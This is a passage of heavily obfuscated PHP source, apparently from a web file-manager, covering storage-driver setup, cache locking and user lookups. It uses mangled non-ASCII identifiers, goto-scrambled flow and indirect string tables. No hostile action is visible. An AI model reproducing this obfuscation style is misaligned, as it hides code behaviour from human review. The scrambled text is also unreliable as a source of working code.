$this->checkConfig($Cä†êÓ«); } unset($Cä†êÓ«[$FÙ¹˜È‡Èà[2429]]); goto cÚš•¹øø; E±½ŠÎ‹ì: } public function add($BÉ§Û½‚ÙÛ) { goto fñ·íîÁÑ; D˜ˆóÉÖ: return $A†Ä¡Ÿ ’”; goto b•’á™’ïê; fñ·íîÁÑ: $a™ƒ»‚«ò =& $_SERVER[åÌÛ»ô¢‚ö™]; $c«‰óÏ‘ŒÎ = array_to_keyvalue(parent::listData(), $a™ƒ»‚«ò[28]); if (isset($c«‰óÏ‘ŒÎ[$BÉ§Û½‚ÙÛ[$a™ƒ»‚«ò[28]]])) { return !1; } goto CÄéÍˆÔ‚Ï; CÄéÍˆÔ‚Ï: $this->checkConfig($BÉ§Û½‚ÙÛ); $A†Ä¡Ÿ ’” = parent::insert($BÉ§Û½‚ÙÛ); if ($A†Ä¡Ÿ ’” && $BÉ§Û½‚ÙÛ[$a™ƒ»‚«ò[34]]) { foreach ($c«‰óÏ‘ŒÎ as $EòèíÍÍå–) { if ($EòèíÍÍå–[$a™ƒ»‚«ò[34]]) { parent::update($EòèíÍÍå–[$a™ƒ»‚«ò[392]], array($a™ƒ»‚«ò[34] => 0)); } } } goto D˜ˆóÉÖ; b•’á™’ïê: } public function checkConfig(&$C×È“ôÅÃ¤) { goto FÍ ôê–ã™; A²º‘®´ÄÀ: $aƒ²¤Ø = new $F÷ÓÍÉêì„($cÅŸÉ£˜öŒ); if (in_array($aÙï»‘ä±Õ, $aƒ²¤Ø->objectDriver)) { if (!$aƒ²¤Ø->isBucketCors() && !$aƒ²¤Ø->setBucketCors()) { $eíÚ¦„µ¶Ó = LNG($Cß±•Òßë‚[2434]); $eíÚ¦„µ¶Ó .= $Cß±•Òßë‚[2435] . LNG($Cß±•Òßë‚[2436]); show_json($eíÚ¦„µ¶Ó, !1); } } $EÅ†òó“Ï = rtrim($cÅŸÉ£˜öŒ[$Cß±•Òßë‚[1051]], $Cß±•Òßë‚[8]) . $Cß±•Òßë‚[8]; goto dğÕ©ô”Ò; dğÕ©ô”Ò: $bÔä˜ë§Œ = $aƒ²¤Ø->getPath($EÅ†òó“Ï . $Cß±•Òßë‚[2019]); if (!$aƒ²¤Ø->mkfile($bÔä˜ë§Œ)) { show_json(LNG($Cß±•Òßë‚[2434]), !1); } $cÅŸÉ£˜öŒ[$Cß±•Òßë‚[1051]] = $EÅ†òó“Ï; goto FôìÙ¢«Œ‚; FÍ ôê–ã™: $Cß±•Òßë‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÙï»‘ä±Õ = strtolower($C×È“ôÅÃ¤[$Cß±•Òßë‚[90]]); $cÅŸÉ£˜öŒ = json_decode($C×È“ôÅÃ¤[$Cß±•Òßë‚[6]], !0); goto bŠªö¤Î¡; FôìÙ¢«Œ‚: $C×È“ôÅÃ¤[$Cß±•Òßë‚[6]] = json_encode($cÅŸÉ£˜öŒ); $C×È“ôÅÃ¤[$Cß±•Òßë‚[90]] = $dÖíšÈ°ŒØ; return !0; goto dºà¥ŒÛ»—; bŠªö¤Î¡: foreach ($cÅŸÉ£˜öŒ as $cÄùì»¢ù => $a˜º´•œÏÜ) { $cÅŸÉ£˜öŒ[$cÄùì»¢ù] = trim($a˜º´•œÏÜ); } $cÅŸÉ£˜öŒ[$Cß±•Òßë‚[2430]] = rand_string(6); $DŞ¶àŠĞÒ’ = $GLOBALS[$Cß±•Òßë‚[6]][$Cß±•Òßë‚[84]][$Cß±•Òßë‚[779]]; goto bªğ«’¿ÑÒ; bªğ«’¿ÑÒ: $dÖíšÈ°ŒØ = isset($DŞ¶àŠĞÒ’[$aÙï»‘ä±Õ]) ? $DŞ¶àŠĞÒ’[$aÙï»‘ä±Õ] : ucfirst($aÙï»‘ä±Õ); $F÷ÓÍÉêì„ = $Cß±•Òßë‚[71] . $dÖíšÈ°ŒØ; if (!$dÖíšÈ°ŒØ || !class_exists($F÷ÓÍÉêì„)) { write_log(array($Cß±•Òßë‚[2431], $C×È“ôÅÃ¤, get_caller_info()), $Cß±•Òßë‚[2432]); show_json(LNG($Cß±•Òßë‚[2433]), !1, $C×È“ôÅÃ¤); } goto A²º‘®´ÄÀ; dºà¥ŒÛ»—: } public function driverListSystem() { $fÕ çÄ·ëò =& $_SERVER[åÌÛ»ô¢‚ö™]; $c’İ˜¶ù­³ = parent::listData(); $cÊ¡ËÎÖÕ  = array(); foreach ($c’İ˜¶ù­³ as $EŸä¥î‹óå) { unset($EŸä¥î‹óå[$fÕ çÄ·ëò[200]], $EŸä¥î‹óå[$fÕ çÄ·ëò[107]]); $EŸä¥î‹óå[$fÕ çÄ·ëò[6]] = json_decode($EŸä¥î‹óå[$fÕ çÄ·ëò[6]], !0); $cÊ¡ËÎÖÕ [] = $EŸä¥î‹óå; } return $cÊ¡ËÎÖÕ ; } public function defaultDriver() { $b™×£óñÕÊ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A¸¼¸…Ë–ã = parent::listData(); $f©˜İ¸ï«š = array_filter_by_field($A¸¼¸…Ë–ã, $b™×£óñÕÊ[34], 1); $f©˜İ¸ï«š = $f©˜İ¸ï«š[0]; if ($f©˜İ¸ï«š) { $f©˜İ¸ï«š[$b™×£óñÕÊ[6]] = json_decode($f©˜İ¸ï«š[$b™×£óñÕÊ[6]], !0); } return $f©˜İ¸ï«š; } public function driverInfo($c„á±ä¥Ÿå) { $cË¨øğØÕÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¸‡¬æÇ² = array_to_keyvalue(parent::listData(), $cË¨øğØÕÒ[392]); if (!isset($e¸‡¬æÇ²[$c„á±ä¥Ÿå])) { return !1; } $D¬îó‘å¦ë = $e¸‡¬æÇ²[$c„á±ä¥Ÿå]; $D¬îó‘å¦ë[$cË¨øğØÕÒ[6]] = json_decode($D¬îó‘å¦ë[$cË¨øğØÕÒ[6]], !0); return $D¬îó‘å¦ë; } public function remove($A¦ê¬œ³•—) { $this->removeShareItems($A¦ê¬œ³•—); return parent::remove($A¦ê¬œ³•—); } public function removeWithFile($C™ÖÉÂˆŠ, $DÈÊÀ±å™„) { goto F…ğÑŠ¶ˆ; B£Ş°¶÷öÁ: $A¬«ºÖ©åÜ = "\173\x69\x6f\x3a{$eºÍñË¿Ø}\175\x2f"; $F´…—º»Õ£ = !0; $D·†Á¤ïº– = array(); goto Cäˆñ¢È–; Cäˆñ¢È–: $F›çÓàï®® = Model($fç½©ö¸°°[171])->where($døÃÍ™ê½è)->field($fç½©ö¸°°[2439])->select(); foreach ($F›çÓàï®® as $CçÊÆË¦Ê) { goto c«Œ¨±¸ŒŞ; c«Œ¨±¸ŒŞ: $DÏ¶é”ŞÃ´ = $CçÊÆË¦Ê[$fç½©ö¸°°[75]]; $EÓ•ì¾…¡ = $A¬«ºÖ©åÜ . str_replace("\173\x69\157\x3a{$C™ÖÉÂˆŠ}\x7d\x2f", $fç½©ö¸°°[33], $DÏ¶é”ŞÃ´); if (!IO::exist($DÏ¶é”ŞÃ´)) { $D·†Á¤ïº–[] = $CçÊÆË¦Ê[$fç½©ö¸°°[444]]; $f–»®ÎğŞè->updateFileEnd($CçÊÆË¦Ê[$fç½©ö¸°°[28]], $CçÊÆË¦Ê[$fç½©ö¸°°[77]]); continue; } goto fßå é—„ç; F¡õÛ­Òá: $añã…Ê®ÚŞ = array($fç½©ö¸°°[770] => $eºÍñË¿Ø, $fç½©ö¸°°[75] => $EÓ•ì¾…¡); Model($fç½©ö¸°°[171])->where($døÃÍ™ê½è)->save($añã…Ê®ÚŞ); goto A„Õ•È¸ª¹; fßå é—„ç: if (IO::exist($EÓ•ì¾…¡)) { $f–»®ÎğŞè->updateFileEnd($CçÊÆË¦Ê[$fç½©ö¸°°[28]], $CçÊÆË¦Ê[$fç½©ö¸°°[77]]); continue; } if (!IO::move($DÏ¶é”ŞÃ´, get_path_father($EÓ•ì¾…¡))) { $F´…—º»Õ£ = !1; break; } $døÃÍ™ê½è = array($fç½©ö¸°°[444] => $CçÊÆË¦Ê[$fç½©ö¸°°[444]]); goto F¡õÛ­Òá; A„Õ•È¸ª¹: } $this->removeByFileID($D·†Á¤ïº–); goto D¹¿§²ÕÇ; BÃß¯×ÃØƒ: $f–»®ÎğŞè->task[$fç½©ö¸°°[725]] = (double) $eØäõÌÔ¼ñ; $DñÍÕØí = KodIO::defaultDriver(); $eºÍñË¿Ø = $DñÍÕØí[$fç½©ö¸°°[392]]; goto B£Ş°¶÷öÁ; D¹¿§²ÕÇ: if (!$F´…—º»Õ£) { $f–»®ÎğŞè->stop($dÒºÈ¿éÊĞ); return !1; } $f–»®ÎğŞè->end(); if ($DÈÊÀ±å™„ == $fç½©ö¸°°[2104]) { $this->remove($C™ÖÉÂˆŠ); } goto CóŠ¤Ÿ¡ Ú; c’Áöåˆ¹ê: $eØäõÌÔ¼ñ = Model($fç½©ö¸°°[447])->where($døÃÍ™ê½è)->sum($fç½©ö¸°°[77]); $dÒºÈ¿éÊĞ = $DÈÊÀ±å™„ . $fç½©ö¸°°[2437] . $C™ÖÉÂˆŠ; $f–»®ÎğŞè = new TaskFileTransfer($dÒºÈ¿éÊĞ, $fç½©ö¸°°[2432], $eòâÁ¬‚İ†, LNG($fç½©ö¸°°[2438]) . "\x28{$C™ÖÉÂˆŠ}\51"); goto BÃß¯×ÃØƒ; F…ğÑŠ¶ˆ: $fç½©ö¸°° =& $_SERVER[åÌÛ»ô¢‚ö™]; $døÃÍ™ê½è = array($fç½©ö¸°°[770] => $C™ÖÉÂˆŠ); $eòâÁ¬‚İ† = Model($fç½©ö¸°°[447])->where($døÃÍ™ê½è)->count(); goto c’Áöåˆ¹ê; CóŠ¤Ÿ¡ Ú: } public function progress($A…ÌÙœŸª, $dÖÏ½±ƒáÁ) { return Task::get($dÖÏ½±ƒáÁ . $_SERVER[åÌÛ»ô¢‚ö™][2437] . $A…ÌÙœŸª); } private function removeByFileID($f½©ãŞ´ª = array()) { goto Dê¨¾‡âÁÉ; Dê¨¾‡âÁÉ: $Eƒµ™•‹‘Ã =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($f½©ãŞ´ª)) { return; } $eå‚Û§ØÙ = array($Eƒµ™•‹‘Ã[444] => array($Eƒµ™•‹‘Ã[7], $f½©ãŞ´ª)); goto BèàÒÔ¿ˆÑ; BèàÒÔ¿ˆÑ: $A¤·†·Øëô = Model($Eƒµ™•‹‘Ã[1143])->where($eå‚Û§ØÙ)->field($Eƒµ™•‹‘Ã[394])->select(); if (!$A¤·†·Øëô) { return; } $A¤·†·Øëô = array_to_keyvalue($A¤·†·Øëô, $Eƒµ™•‹‘Ã[33], $Eƒµ™•‹‘Ã[394]); goto A™øùà¨¨ğ; A™øùà¨¨ğ: foreach ($A¤·†·Øëô as $aââÖ‘ñƒÕ) { Model($Eƒµ™•‹‘Ã[407])->removeNow($aââÖ‘ñƒÕ, !1); } goto cÜ‡‘“¼ğˆ; cÜ‡‘“¼ğˆ: } private function removeShareItems($Eİª®ˆø° ) { goto cø±—¨‰‘; cø±—¨‰‘: $BÎÌ“ó·÷ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cáš‡Š½ôœ = "\173\x69\x6f\x3a{$Eİª®ˆø° }\175\x2f"; $EŒãƒâ²Œ¨ = array($BÎÌ“ó·÷[394] => 0, $BÎÌ“ó·÷[1046] => array($BÎÌ“ó·÷[382], "{$Cáš‡Š½ôœ}\45")); goto B¼º¦š³ñÁ; b†°²òŒÙÛ: Model($BÎÌ“ó·÷[561])->remove($aì¶ìïºÛ§); goto eéÎóÆôŠã; B¼º¦š³ñÁ: $EÑŠâöáÛ = Model($BÎÌ“ó·÷[2115])->where($EŒãƒâ²Œ¨)->field($BÎÌ“ó·÷[465])->select(); if (empty($EÑŠâöáÛ)) { return; } $aì¶ìïºÛ§ = array_to_keyvalue($EÑŠâöáÛ, $BÎÌ“ó·÷[33], $BÎÌ“ó·÷[465]); goto b†°²òŒÙÛ; eéÎóÆôŠã: } } goto f‚’ÒßïË; b¶çŒïÀö¦: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto b¿°İ¸ÛÄ; b¿°İ¸ÛÄ: $EŒœ¿±Ê³™ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (self::$handle) { return self::$handle; } $a¡†œ„‘ùò = $GLOBALS[$EŒœ¿±Ê³™[6]][$EŒœ¿±Ê³™[352]]; goto C‚‰ƒĞÕà; dÀŒ Ñµİ„: if ($bµ ÀÍ…º° == $EŒœ¿±Ê³™[17] && $b¥ôÅöŒ¢ == $EŒœ¿±Ê³™[9]) { $bµ ÀÍ…º° = $EŒœ¿±Ê³™[171]; } switch ($bµ ÀÍ…º°) { case $EŒœ¿±Ê³™[783]: self::$handle = new CacheLockRedis(); break; case $EŒœ¿±Ê³™[784]: self::$handle = new CacheLockMemcached(); break; case $EŒœ¿±Ê³™[17]: self::$handle = new CacheLockDatabase(); break; case $EŒœ¿±Ê³™[171]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto E‚ÑöŒ¨„›; C‚‰ƒĞÕà: self::$timeout = $a¡†œ„‘ùò[$EŒœ¿±Ê³™[794]] ? $a¡†œ„‘ùò[$EŒœ¿±Ê³™[794]] : 10; $b¥ôÅöŒ¢ = _get($GLOBALS[$EŒœ¿±Ê³™[6]], $EŒœ¿±Ê³™[795]); $bµ ÀÍ…º° = $a¡†œ„‘ùò[$EŒœ¿±Ê³™[780]] ? $a¡†œ„‘ùò[$EŒœ¿±Ê³™[780]] : $EŒœ¿±Ê³™[171]; goto dÀŒ Ñµİ„; E‚ÑöŒ¨„›: } private static function key($f•„¢ÓƒˆÔ) { return $_SERVER[åÌÛ»ô¢‚ö™][796] . Cache::key($f•„¢ÓƒˆÔ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($CœÄÉÖŞ×Ô = '') { self::$errorMsg = $CœÄÉÖŞ×Ô; } public static function lockGlobal($då²Êğ‰ï­, $fÚ´¼Â¦) { return self::lock($då²Êğ‰ï­, $fÚ´¼Â¦, !0); } public static function lock($bŒŸ‡êâöÛ, $EˆŞƒÎØĞ = false, $D™×Ü“Ñ¸  = false) { goto fÑóÖÑÈÙá; BÁßã®‹¥É: if (!$D™×Ü“Ñ¸ ) { self::$lockItem[$DÃÂ©Ç¹—ø] = !0; } return $Aˆ¹ÌÎñ´; goto CÁÑ‰š‰÷; fÑóÖÑÈÙá: $BÈ’Æ†Œ‚¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f¬•èğÛÙƒ = self::init(); $DÃÂ©Ç¹—ø = self::key($bŒŸ‡êâöÛ); goto C™ã¾ñš£æ; C™ã¾ñš£æ: $EˆŞƒÎØĞ = $EˆŞƒÎØĞ ? $EˆŞƒÎØĞ : self::$timeout; $Aˆ¹ÌÎñ´ = $f¬•èğÛÙƒ->lock($DÃÂ©Ç¹—ø, $EˆŞƒÎØĞ); if (!$Aˆ¹ÌÎñ´) { $a¥ğ‰‰çä² = $BÈ’Æ†Œ‚¹[797] . $EˆŞƒÎØĞ . $BÈ’Æ†Œ‚¹[67] . self::$errorMsg . $BÈ’Æ†Œ‚¹[67] . get_caller_msg(); $CÚá±Å“ = "\114\x6f\143\x6b\40\141\143\x74\151\x6f\x6e\x3a\40{$DÃÂ©Ç¹—ø}\40\x74\x69\155\x65\157\x75\164\x2c\x6f\166\x65\x72\40{$EˆŞƒÎØĞ}\x20\x73"; if (is_string(self::$errorMsg) && self::$errorMsg) { $CÚá±Å“ = self::$errorMsg; } write_log($a¥ğ‰‰çä², $BÈ’Æ†Œ‚¹[798]); show_json($CÚá±Å“, !1); } goto BÁßã®‹¥É; CÁÑ‰š‰÷: } public static function lockGet($DƒŞ´‡Í¨µ) { $C´äåéŸ…Ğ = self::key($DƒŞ´‡Í¨µ); if (self::$lockItem[$C´äåéŸ…Ğ]) { return self::$lockItem[$C´äåéŸ…Ğ]; } return self::init()->lockGet($C´äåéŸ…Ğ); } public static function unlock($Eƒ½–ƒÁã±) { $Bè©óµ¼Á = self::key($Eƒ½–ƒÁã±); self::$lockItem[$Bè©óµ¼Á] = null; return self::init()->unlock($Bè©óµ¼Á); } public static function unlockRuntime() { $B¬É«“Ÿğˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e¾ªÊ­ãÊ = self::init(); $AÁŸÌêÙã‹ = !1; foreach (self::$lockItem as $eÊöˆ¢ƒÖñ => $f¤Æø‘Ÿã) { if (!$f¤Æø‘Ÿã) { continue; } $e¾ªÊ­ãÊ->unlock($eÊöˆ¢ƒÖñ); if (!$AÁŸÌêÙã‹) { $AÁŸÌêÙã‹ = !0; write_log($B¬É«“Ÿğˆ[799] . $eÊöˆ¢ƒÖñ . $B¬É«“Ÿğˆ[67] . get_caller_msg(), $B¬É«“Ÿğˆ[798]); continue; } write_log($B¬É«“Ÿğˆ[799] . $eÊöˆ¢ƒÖñ, $B¬É«“Ÿğˆ[798]); } self::fileUnlockAll(); } public static function fileLock($d”º¼¼Ú‚ó) { goto FÈïíœ×‹Å; A‰Ä¯””ÌÂ: $dŸ¢ŞŒ¢ã’ = fopen(DATA_PATH . $d”º¼¼Ú‚ó . $cÉ®Æêó[801], $cÉ®Æêó[802]); if (!$dŸ¢ŞŒ¢ã’) { return !1; } $GLOBALS[$cÉ®Æêó[800]][$d”º¼¼Ú‚ó] = $dŸ¢ŞŒ¢ã’; goto bÒõ¬Şç’; F”…ğ¥ó: return !1; goto DĞñœ¼¯Ã; FÈïíœ×‹Å: $cÉ®Æêó =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$GLOBALS[$cÉ®Æêó[800]]) { $GLOBALS[$cÉ®Æêó[800]] = array(); } $GLOBALS[$cÉ®Æêó[800]][$d”º¼¼Ú‚ó] = !1; goto A‰Ä¯””ÌÂ; bÒõ¬Şç’: if (flock($dŸ¢ŞŒ¢ã’, LOCK_EX)) { return !0; } self::unlock($d”º¼¼Ú‚ó); show_json($cÉ®Æêó[803], !1); goto F”…ğ¥ó; DĞñœ¼¯Ã: } public static function fileUnlock($eóÖì”ÈäÌ) { $f³›õ³Ÿê =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÆ™‚İ„ = $GLOBALS[$f³›õ³Ÿê[800]][$eóÖì”ÈäÌ]; if (!$EÆ™‚İ„) { return; } $GLOBALS[$f³›õ³Ÿê[800]][$eóÖì”ÈäÌ] = !1; flock($EÆ™‚İ„, LOCK_UN); fclose($EÆ™‚İ„); } public static function fileUnlockAll() { $c×ª”õ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$GLOBALS[$c×ª”õ[800]]) { return; } foreach ($GLOBALS[$c×ª”õ[800]] as $Eè‹…†‰ª => $AŠĞ‹ÅèŞ) { if (!$AŠĞ‹ÅèŞ) { continue; } $GLOBALS[$c×ª”õ[800]][$Eè‹…†‰ª] = !1; flock($AŠĞ‹ÅèŞ, LOCK_UN); fclose($AŠĞ‹ÅèŞ); } $GLOBALS[$c×ª”õ[800]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $d‡„¥Ğñ‡ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Få¨ƒÏã²¥ = $GLOBALS[$d‡„¥Ğñ‡ƒ[6]][$d‡„¥Ğñ‡ƒ[352]]; self::$cachePath = $Få¨ƒÏã²¥[$d‡„¥Ğñ‡ƒ[171]][$d‡„¥Ğñ‡ƒ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($féµ‘¹×Å¿, $CÁ—ò¬µÆ = 0) { goto bÍÉ³ñ³; d·¿µïÀà: $fÍé‘¹«† = rtrim(self::$cachePath, $EÏ…³¬…®ö[8]) . $EÏ…³¬…®ö[804] . md5($féµ‘¹×Å¿) . $EÏ…³¬…®ö[801]; if (file_exists($fÍé‘¹«†) && filemtime($fÍé‘¹«†) && filemtime($fÍé‘¹«†) < time() - 10) { @unlink($fÍé‘¹«†); } do { if (file_exists($fÍé‘¹«†)) { cacheLockWait(); continue; } $FŠ«ñ¦ßÅï = fopen($fÍé‘¹«†, $EÏ…³¬…®ö[805]); if (!$FŠ«ñ¦ßÅï) { return !1; } $b‰óò²‹‘‰ = flock($FŠ«ñ¦ßÅï, LOCK_EX | LOCK_NB); self::$caches[$féµ‘¹×Å¿] = array($EÏ…³¬…®ö[806] => $FŠ«ñ¦ßÅï, $EÏ…³¬…®ö[171] => $fÍé‘¹«†); fwrite($FŠ«ñ¦ßÅï, $c©Œ¹Ÿ‚»ß); clearstatcache(); if ($FŠ«ñ¦ßÅï && $b‰óò²‹‘‰) { return !0; } cacheLockWait(); } while (microtime(!0) < $c©Œ¹Ÿ‚»ß); goto bòµ†ï—å©; bÍÉ³ñ³: $EÏ…³¬…®ö =& $_SERVER[åÌÛ»ô¢‚ö™]; $aŞõ´ª¡ = microtime(!0); $c©Œ¹Ÿ‚»ß = $aŞõ´ª¡ + $CÁ—ò¬µÆ + 0.0001; goto d·¿µïÀà; bòµ†ï—å©: $this->unlock($féµ‘¹×Å¿); return !1; goto BôÇ…º“´©; BôÇ…º“´©: } public function lockGet($Bë•ê†ñƒ) { $CçìÀğâÄ³ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fôŒ†Ñ§ö = rtrim(self::$cachePath, $CçìÀğâÄ³[8]) . $CçìÀğâÄ³[804] . md5($Bë•ê†ñƒ) . $CçìÀğâÄ³[801]; return file_exists($fôŒ†Ñ§ö); } public function unlock($cÛ¬Ãì´¬í) { goto f«ßÛìõÏê; EÖ‹‹¿¸¢£: @flock($D†ØÑ»£Í‹[$dğâºÀ¥’ë[806]], LOCK_UN); @fclose($D†ØÑ»£Í‹[$dğâºÀ¥’ë[806]]); @unlink($D†ØÑ»£Í‹[$dğâºÀ¥’ë[171]]); goto A¡êòÛÕÓ¥; f«ßÛìõÏê: $dğâºÀ¥’ë =& $_SERVER[åÌÛ»ô¢‚ö™]; $D†ØÑ»£Í‹ = self::$caches[$cÛ¬Ãì´¬í]; if (!$D†ØÑ»£Í‹) { return; } goto EÖ‹‹¿¸¢£; A¡êòÛÕÓ¥: unset(self::$caches[$cÛ¬Ãì´¬í]); goto f£¸Å¼; f£¸Å¼: } } goto FÃëö´’Ÿ³; aˆ¢î«•Ÿä: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\x65" => "\165\x73\x65\x72\x5f\x6d\x65\164\141", "\155\145\x74\x61\x46\x69\x65\x6c\x64" => "\x75\163\x65\x72\111\104"); protected $simpleField = "\x75\x73\x65\x72\x49\x44\x2c\x6e\151\143\x6b\x4e\141\x6d\x65\x2c\156\x61\x6d\145\54\141\x76\141\164\x61\162\54\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Eğ„À³Á‡í) { $dÌùÊ‚Ç²ì =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¤ÂÏ…£Ğ÷ = $dÌùÊ‚Ç²ì[2549]; return array($dÌùÊ‚Ç²ì[2207] => array($Eğ„À³Á‡í[0], $b¤ÂÏ…£Ğ÷), $dÌùÊ‚Ç²ì[2209] => array($Eğ„À³Á‡í[0], $b¤ÂÏ…£Ğ÷), $dÌùÊ‚Ç²ì[2550] => array($Eğ„À³Á‡í[0], $b¤ÂÏ…£Ğ÷)); } protected function getInfo($a†¤ëº¤÷Š, $fÎğ£èïš¦ = false) { $DÊ‘¯•‰ãš = $this->getInfoSimple($a†¤ëº¤÷Š); if (!is_array($DÊ‘¯•‰ãš)) { return array(); } if ($fÎğ£èïš¦) { return $this->_getInfoApply($DÊ‘¯•‰ãš); } return $this->cacheFunctionGet($_SERVER[åÌÛ»ô¢‚ö™][2263], $a†¤ëº¤÷Š); } protected function getInfoFull($F´¹Şâò®Û, $fè‘ïòµÓÁ = false) { $e¹¯±™Êâ¤ = $this->getInfoSimple($F´¹Şâò®Û); if (!is_array($e¹¯±™Êâ¤)) { return array(); } if ($fè‘ïòµÓÁ) { return $this->_getInfoApply($e¹¯±™Êâ¤, !0); return $this->_getInfoApply($e¹¯±™Êâ¤, !0); } return $this->cacheFunctionGet($_SERVER[åÌÛ»ô¢‚ö™][2551], $F´¹Şâò®Û); } private function _getInfoApply($AàÖÙ³ùæÄ, $b§¦Š™·ùˆ = false) { goto aí‘Œ£; d²—½ù•™: $AàÖÙ³ùæÄ = $this->_listDataApplyItem($AàÖÙ³ùæÄ); $B­ã»Äƒ¨ = Model($fëÅ¶éï[1143])->metaGet($AàÖÙ³ùæÄ[$fëÅ¶éï[416]][$fëÅ¶éï[394]]); $AàÖÙ³ùæÄ[$fëÅ¶éï[2554]] = $eì‰ƒ”˜ÔŠ; goto cëŠä‰Ú›ù; aí‘Œ£: $fëÅ¶éï =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$AàÖÙ³ùæÄ) { return $AàÖÙ³ùæÄ; } $eì‰ƒ”˜ÔŠ = md5($fëÅ¶éï[2552] . $AàÖÙ³ùæÄ[$fëÅ¶éï[827]] . $fëÅ¶éï[2553] . $AàÖÙ³ùæÄ[$fëÅ¶éï[28]]); goto d²—½ù•™; cëŠä‰Ú›ù: $AàÖÙ³ùæÄ[$fëÅ¶éï[416]][$fëÅ¶éï[2392]] = isset($B­ã»Äƒ¨[$fëÅ¶éï[2393]]) ? $B­ã»Äƒ¨[$fëÅ¶éï[2393]] : null; if ($b§¦Š™·ùˆ) { $AàÖÙ³ùæÄ[$fëÅ¶éï[442]] = $this->metaGet($AàÖÙ³ùæÄ[$fëÅ¶éï[1465]]); } return $AàÖÙ³ùæÄ; goto aòÊŠÚÈ; aòÊŠÚÈ: } protected function getInfoSimple($f¥©øÜŒÙ , $DÛ¯ù…Ï£ = false) { $eø‹ ŒªŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$f¥©øÜŒÙ ) { return array(); } if ($DÛ¯ù…Ï£) { $B„ˆÍ¶ºÚ = $this->where(array($eø‹ ŒªŠ[1465] => intval($f¥©øÜŒÙ )))->find(); if (!is_array($B„ˆÍ¶ºÚ)) { return array(); } $B„ˆÍ¶ºÚ[$eø‹ ŒªŠ[2555]] = Action($eø‹ ŒªŠ[2556])->parseUrl($B„ˆÍ¶ºÚ[$eø‹ ŒªŠ[2555]]); return $B„ˆÍ¶ºÚ; } return $this->cacheFunctionGet($eø‹ ŒªŠ[2210], $f¥©øÜŒÙ ); } protected function getInfoSimpleOuter($BÍ³ùõÚ³‚) { goto b†ˆ°­Á•; C¿ ¯ßšĞ§: return $D—š¦ª…íˆ; goto A‚—©ØŒôÄ; eÏ›™ˆ×Êğ: $D—š¦ª…íˆ = array_field_key($Bâ‰è…Âáö, explode($dÁˆÕ¼‡[47], $this->simpleField)); if (!$D—š¦ª…íˆ) { return array($dÁˆÕ¼‡[1465] => $dÁˆÕ¼‡[1058], $dÁˆÕ¼‡[28] => $dÁˆÕ¼‡[157] . LNG($dÁˆÕ¼‡[2559]) . $dÁˆÕ¼‡[502], $dÁˆÕ¼‡[2555] => STATIC_PATH . $dÁˆÕ¼‡[2560]); } $D—š¦ª…íˆ[$dÁˆÕ¼‡[2555]] = Action($dÁˆÕ¼‡[2556])->parseUrl($D—š¦ª…íˆ[$dÁˆÕ¼‡[2555]]); goto C¿ ¯ßšĞ§; b†ˆ°­Á•: $dÁˆÕ¼‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$BÍ³ùõÚ³‚ || $BÍ³ùõÚ³‚ == 0) { return array($dÁˆÕ¼‡[1465] => $dÁˆÕ¼‡[494], $dÁˆÕ¼‡[28] => $dÁˆÕ¼‡[157] . LNG($dÁˆÕ¼‡[2557]) . $dÁˆÕ¼‡[502], $dÁˆÕ¼‡[2555] => STATIC_PATH . $dÁˆÕ¼‡[2558]); } $Bâ‰è…Âáö = $this->cacheFunctionGet($dÁˆÕ¼‡[2210], $BÍ³ùõÚ³‚); goto eÏ›™ˆ×Êğ; A‚—©ØŒôÄ: } protected function groupUser($b·­²¯¥‹¶) { } public static function errorLang($DÜ¬æğĞŞ) { $dŞ»…Ñ„“ˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cºšº–µ‡‰ = array(self::ERROR_USER_NOT_EXISTS => $dŞ»…Ñ„“ˆ[2561], self::ERROR_USER_PASSWORD_ERROR => $dŞ»…Ñ„“ˆ[2562], self::ERROR_USER_EXIST_NAME => $dŞ»…Ñ„“ˆ[2563], self::ERROR_USER_EXIST_PHONE => $dŞ»…Ñ„“ˆ[2564], self::ERROR_USER_EXIST_EMAIL => $dŞ»…Ñ„“ˆ[2565], self::ERROR_USER_LOGIN_LOCK => $dŞ»…Ñ„“ˆ[2566], self::ERROR_IP_NOT_ALLOW => $dŞ»…Ñ„“ˆ[2567], self::ERROR_USER_EXIST_NICKNAME => $dŞ»…Ñ„“ˆ[2568]); return LNG($cºšº–µ‡‰[$DÜ¬æğĞŞ]); } public function getInfoByMeta($bñ„© ŒÒ´, $E¦ƒ‰ÜÈ­Ù) { $A‚ ğ¾èà¢ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A†êæ†çŠÀ = Model($A‚ ğ¾èà¢[2569])->where(array($A‚ ğ¾èà¢[89] => $bñ„© ŒÒ´, $A‚ ğ¾èà¢[375] => $E¦ƒ‰ÜÈ­Ù))->find(); if 